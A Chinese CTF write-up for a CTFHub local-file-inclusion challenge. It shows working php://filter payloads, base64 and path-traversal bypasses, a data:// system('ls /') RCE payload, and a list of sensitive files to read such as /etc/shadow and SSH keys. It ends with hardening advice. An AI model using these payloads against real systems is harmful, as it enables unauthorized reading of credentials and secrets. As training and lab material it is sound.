---
layout: post
title: CTFHub - php://filter 读文件 Writeup
platform: ctfhub
date: 2026-10-23 19:20:00 +0800
categories: CTF
---

CTFHub - php://filter 读文件 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件包含** → php://filter 读文件）
- 题型：Web
- 考点：**`php://filter` 直接读任意文件**（不需要 `allow_url_include`）


```text
★ 页面源码：

    <?php
    error_reporting(E_ALL);            // ★ 这次连错误都显示（方便调试）
    if (isset($_GET['file'])) {
        if ( substr($_GET["file"], 0, 6) === "php://" ) {
            include($_GET["file"]);
        } else {
            echo "Hacker!!!";
        }
    } else {
        highlight_file(__FILE__);
    }
    ?>
    <hr>
    i don't have shell, how to get flag? <br>
    flag in <code>/flag</code>

    ★ 关键提示：flag 就在 /flag
    ★ 限制：只能用 php:// 开头
    ★ 没有 phpinfo 链接（不用查配置了）

★ 一条 payload 直接出 flag：

    ?file=php://filter/resource=/flag
    → ctfhub{56e886cda8c140ce1376901e}

    ★ 就这么简单！不需要 RCE，不需要 allow_url_include

★ 其他验证（都成功）：

    ?file=php://filter/convert.base64-encode/resource=/flag
    → Y3RmaHViezU2ZTg4NmNkYThjMTQwY2UxMzc2OTAxZX0K
    → Base64 解码 = ctfhub{56e886cda8c140ce1376901e}

    ?file=php://filter/resource=../../../../flag
    → ctfhub{56e886cda8c140ce1376901e}      （路径穿越也行）

    ?file=php://filter/convert.base64-encode/resource=index.php
    → PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKS...
    （Base64 解码 = index.php 的源码，能读到完整的 PHP 代码）

flag         : ctfhub{56e886cda8c140ce1376901e}
```

二、题目分析

**① 为什么 `php://filter/resource=/flag` 能读出 flag**

```php
include('php://filter/resource=/flag');
```

**执行过程**：

```
① include 请求 "php://filter" 流
② php://filter 去读它的 resource，即 /flag（本地文件）
   ★ 读本地文件【不需要】allow_url_include
   ★ 只需要文件存在、有权限读
③ /flag 的内容是纯文本："ctfhub{56e886cda8c140ce1376901e}\n"
④ php://filter 没有过滤器 → 原样返回这段文本
⑤ include 拿到内容 → 尝试当 PHP 代码解析
   ★ 内容里没有 <?php ?> 标签 → 全部当"HTML 文本"输出
⑥ 于是 flag 就显示在页面上了
```

**★ 核心认知**：

```
include 一个文件时：
    · 有 <?php ?> 标签 → 执行
    · 没有标签 → 原样输出（当普通文本）

所以读一个纯文本文件（比如 flag）→ 内容直接显示出来
```

**② 为什么这题比上一题简单**

| | 上一题（php://filter RCE）| 本题 |
|---|---|---|
| **flag 位置** | `/flag_27298`（随机名，猜不到）| `/flag`（题目直接告诉你）|
| **需要 RCE 吗** | ✅ 需要（先 ls 找文件）| ❌ 不需要（直接读）|
| **依赖配置** | `allow_url_include=On` | 无（读本地文件不需要）|
| **payload** | `php://filter/resource=data://...` | `php://filter/resource=/flag` |
| **难度** | 中 | 低 |

**★ 上一题必须 RCE 是因为"不知道 flag 文件名"；
本题直接告诉你 flag 在 /flag，所以一条 payload 就够。**

**③ `php://filter` 读文件 vs 直接 include**

**直接 include**：

```php
?file=/flag        → 被拦（不是 php:// 开头）
?file=../../flag   → 被拦
```

**用 php://filter**：

```php
?file=php://filter/resource=/flag       → ✅ 通过
```

**★ `php://filter` 的妙用**：

```
它把"文件路径"包装了一层
    外层的 "php://filter" 满足了前缀检查
    内层的 "resource=/flag" 才是真正要读的文件

就像：
    门卫只检查"你背包上有没有 logo"（前缀）
    你把东西装进一个"有 logo 的袋子"（php://filter）就进去了
```

**④ `resource=` 后面的路径可以是绝对路径**

```php
php://filter/resource=/flag             绝对路径
php://filter/resource=../../../../flag   相对路径 + 穿越
php://filter/resource=index.php         同目录文件
php://filter/resource=/etc/passwd       系统文件
```

**★ 只要 PHP 进程有读权限就行。**

**⑤ 为什么要用 `convert.base64-encode`（对于 PHP 文件）**

```php
// 直接读 PHP 文件
?file=php://filter/resource=index.php
→ include 会【执行】index.php → 你看到的是执行结果（可能是空白）

// 用 base64 编码
?file=php://filter/convert.base64-encode/resource=index.php
→ include 拿到的是 Base64 字符串 → 没有 <?php ?> 标签 → 原样输出
→ 你解码 Base64 → 看到完整源码  ✅
```

**★ 这就是"读源码"的标准手法**：

```
纯文本文件（flag、passwd）→ 不用 base64，直接读
PHP 文件（源码）          → 必须 base64，否则被执行
```

**⑥ 本题的 `error_reporting(E_ALL)` 意味着什么**

```php
error_reporting(E_ALL);   // 显示所有错误和警告
```

**好处**（对攻击者）：

```
· 能看到 include 失败的报错（如 "No such file or directory"）
  → 可以探测哪些文件存在
· 能看到警告信息里的路径（泄露绝对路径）
· 调试 payload 时更容易看出问题
```

**★ 在生产环境里，`display_errors = On` + `error_reporting(E_ALL)` 是信息泄露漏洞。**

三、解题步骤

**第 1 步：看源码，确认限制和 flag 位置**

```
首页 → highlight_file 显示源码

    if (substr($_GET["file"], 0, 6) === "php://") {   ← 限制
        include($_GET["file"]);
    }
    
    flag in /flag                                     ← ★ 位置明确
```

**第 2 步：直接用 php://filter 读**

```
浏览器地址栏：

http://challenge-xxx:10800/?file=php://filter/resource=/flag

→ 页面显示：ctfhub{56e886cda8c140ce1376901e}
```

**★ 就这么一步，结束了。**

**第 3 步：提交 → 通关**

---

**备用方案（如果直接读被过滤了字符）**

**用 Base64 编码**：

```
?file=php://filter/convert.base64-encode/resource=/flag
→ Y3RmaHViezU2ZTg4NmNkYThjMTQwY2UxMzc2OTAxZX0K
→ 找个 Base64 解码网站，或 PowerShell：
   [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y3RmaHVie..."))
```

**用路径穿越**：

```
?file=php://filter/resource=../../../../flag
```

**用大小写混合**（如果过滤了 "flag" 这个字符串）：

```
?file=php://filter/resource=/flaG
?file=php://filter/convert.base64-encode/resource=/flag
（base64 输出的内容里不含 "flag" 明文，能绕过内容过滤）
```

---

**用 curl**

```bash
curl "http://challenge-xxx:10800/?file=php://filter/resource=/flag"
```

**用 PowerShell**

```powershell
Invoke-WebRequest -Uri "http://challenge-xxx:10800/?file=php://filter/resource=/flag" -UseBasicParsing |
    Select-Object -ExpandProperty Content
```

**★ 注意**：PowerShell 里 URL 含 `://` 和 `/` 不需要转义，直接放进字符串就行。

---

**读源码的完整流程**

**第 1 步：读 index.php 源码**

```
?file=php://filter/convert.base64-encode/resource=index.php
→ PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKS...
```

**第 2 步：解码**

```powershell
# PowerShell 解码
$b64 = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKS..."
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
```

**Python 解码**：

```python
import base64
print(base64.b64decode("PD9waHAK...").decode())
```

**在线工具**：

```
https://www.base64decode.org/
```

**第 3 步：读到了源码**

```php
<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
```

四、延伸知识

**① `php://filter` 的完整语法**

```php
php://filter/[读过滤器链]/[写过滤器链]/resource=<目标>

示例：
    php://filter/read=convert.base64-encode/resource=/flag
    php://filter/write=convert.base64-decode/resource=x.php
    php://filter/convert.base64-encode/resource=/flag     （省略 read=）
```

**参数**：

```
/resource=<path>   要读/写的目标（必填）
/read=<filter>     读的时候用的过滤器
/write=<filter>    写的时候用的过滤器
（不写 read= 时，第一个过滤器默认是读过滤器）
```

**② 常用过滤器**

| 过滤器 | 作用 | 场景 |
|---|---|---|
| `convert.base64-encode` | Base64 编码 | **读源码** |
| `convert.base64-decode` | Base64 解码 | 写文件、生成代码 |
| `convert.quoted-printable-encode` | QP 编码 | 绕过某些过滤 |
| `convert.iconv.<from>.<to>` | 编码转换 | filter chain RCE |
| `string.rot13` | ROT13 | 变形 |
| `string.toupper` / `string.tolower` | 大小写 | 绕过大小写敏感过滤 |
| `string.strip_tags` | 去 HTML 标签 | |
| `zlib.deflate` / `zlib.inflate` | 压缩/解压 | |
| `convert.base64-encode` 组合 | 多层编码 | 绕过复杂过滤 |

**组合用法**：

```php
# 先转大写再 base64
php://filter/convert.base64-encode|string.toupper/resource=/flag

# 多层过滤器用 | 连接
php://filter/convert.base64-encode|convert.base64-encode/resource=/flag
```

**③ `php://filter` 能读哪些文件**

```php
/flag                          根目录的 flag
/etc/passwd                    系统用户
/etc/shadow                    密码哈希（需要 root）
/proc/self/environ             环境变量
/proc/self/cmdline             启动命令
/var/www/html/config.php       网站配置（含数据库密码）
/root/.bash_history            历史命令
/home/user/.ssh/id_rsa         SSH 私钥
/var/log/apache2/access.log    Apache 日志
```

**★ 只要 PHP 进程有读权限，全都能读。**

**④ `php://filter` 和 `php://input` 的区别**

| | php://filter | php://input |
|---|---|---|
| 读什么 | 任意文件（resource 指定）| POST 请求体 |
| 需要 allow_url_include | ❌ 不需要 | ✅ 需要 |
| 能 RCE 吗 | 单独不能（要配合 data:// 或 filter chain）| ✅ 能（body 写 PHP 代码）|
| 本题用 | ✅ | |

**⑤ 本题和上一题的对比（重要）**

**上一题**（php://filter RCE）：

```
flag 文件名随机（/flag_27298）
→ 必须先 RCE 才能 ls 找文件
→ payload: php://filter/resource=data://text/plain,<?php system('ls /');?>
→ 依赖 allow_url_include=On
```

**本题**（php://filter 读文件）：

```
flag 位置已知（/flag）
→ 直接读就行，不需要命令执行
→ payload: php://filter/resource=/flag
→ 不依赖任何配置
```

**★ 做题时先问自己**：

```
① flag 位置已知吗？
   已知 → 直接读（本题）
   未知 → 需要 RCE 或目录探测

② 能读文件吗？
   php://filter/resource=<path> 几乎总能读（只要文件可读）

③ 读的是 PHP 源码吗？
   是 → 加 convert.base64-encode，避免被执行
```

**⑥ 防护**

```text
① ★ 禁止 include 使用 php:// 协议
    （白名单 + 路径校验）

② ★ 不要用用户输入做 include 路径
    include __DIR__ . '/pages/' . basename($page) . '.php';

③ ★ open_basedir 限制目录
    open_basedir = /var/www/html
    → php://filter 读 /flag 就会失败

④ allow_url_include = Off
⑤ 不要给 Web 进程读敏感文件的权限
    → /flag 权限设为 600，属主 root
    → www-data 读不到

⑥ 关闭错误显示
    display_errors = Off
    → 避免路径泄露
```

五、总结

- **本题核心：`php://filter` 能直接读任意可读文件，不需要 `allow_url_include`。**
- 一条 payload：

```
?file=php://filter/resource=/flag
→ ctfhub{56e886cda8c140ce1376901e}
```

- **三个必记要点**：

```text
① include 纯文本文件 → 内容原样输出（没 <?php ?> 标签就不执行）
② php://filter 的 resource 可以是绝对路径、相对路径、路径穿越
③ 读 PHP 源码要加 convert.base64-encode，否则会被执行
```

- **实测 flag**：

```text
ctfhub{56e886cda8c140ce1376901e}
```


**手工复现要点**：

```text
· 看源码 → 确认前缀限制 + flag 位置
· 一条 URL：?file=php://filter/resource=/flag
· 如果被拦 → 加 base64、换路径穿越、换大小写
· 读源码 → 必加 convert.base64-encode
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  php://filter/resource=<路径> = "读这个文件"             │
│                                                        │
│  include 它时：                                         │
│    纯文本 → 原样显示（★ 本题的 flag）                   │
│    PHP源码 → 被执行（所以要先 base64 编码）             │
│                                                        │
│  它是最"无害"却最有用的伪协议：                          │
│  不需要任何特殊配置，只要文件可读                         │
└────────────────────────────────────────────────────────┘
```
